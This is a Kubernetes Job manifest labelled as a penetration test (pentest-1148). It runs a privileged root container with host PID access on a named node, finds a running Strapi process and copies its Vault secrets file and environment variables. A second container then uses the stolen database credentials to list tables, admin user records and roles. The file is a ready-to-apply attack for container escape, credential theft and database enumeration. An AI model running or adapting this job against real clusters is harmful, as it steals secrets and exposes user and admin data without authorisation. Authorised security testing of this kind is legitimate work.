apiVersion: batch/v1
kind: Job
metadata:
  name: dbq1
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      nodeName: anubis-gateway-chatly-3akkk1
      hostPID: true
      volumes:
      - name: shared
        emptyDir: {}
      containers:
      - name: reader
        image: busybox:1.36
        securityContext:
          privileged: true
          runAsUser: 0
        volumeMounts:
        - name: shared
          mountPath: /shared
        command: ["/bin/sh","-c"]
        args:
        - |
          for p in /proc/[0-9]*; do
            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
            case "$cmd" in
              *strapi.js*start*)
                cat $p/root/vault/secrets/config > /shared/config.env 2>/dev/null
                tr '\0' '\n' < $p/environ > /shared/env.txt 2>/dev/null
                echo "reader: got pid ${p#/proc/} bytes=$(wc -c < /shared/config.env)" > /shared/reader.log
                break
                ;;
            esac
          done
          sleep 150
      - name: psql
        image: postgres:16-alpine
        volumeMounts:
        - name: shared
          mountPath: /shared
        command: ["/bin/sh","-c"]
        args:
        - |
          for i in $(seq 1 90); do [ -s /shared/config.env ] && break; sleep 2; done
          cat /shared/reader.log
          . /shared/config.env
          export PGPASSWORD="$DATABASE_PASSWORD" PGHOST="$DATABASE_HOST" PGPORT="$DATABASE_PORT" PGDATABASE="$DATABASE_NAME" PGUSER="$DATABASE_USERNAME" PGSSLMODE=require
          echo "##VER"; psql -Atc "select version()" 2>&1
          echo "##WHO"; psql -Atc "select current_user, current_database()" 2>&1
          echo "##TABLES"; psql -Atc "select table_name from information_schema.tables where table_schema='public' order by 1" 2>&1
          echo "##ADMINCOLS"; psql -Atc "select table_name||'.'||column_name||':'||data_type from information_schema.columns where table_schema='public' and (table_name ~* 'admin|session|role' ) order by 1,2" 2>&1
          echo "##COUNTS"; psql -Atc "select count(*) from admin_users" 2>&1
          echo "##USERS"; psql -Atc "select id||'|'||left(email,3)||'***|'||is_active||'|'||blocked from admin_users order by id" 2>&1
          echo "##ROLES"; psql -Atc "select id||'|'||name||'|'||code from admin_roles order by id" 2>&1
          echo "##DONE"
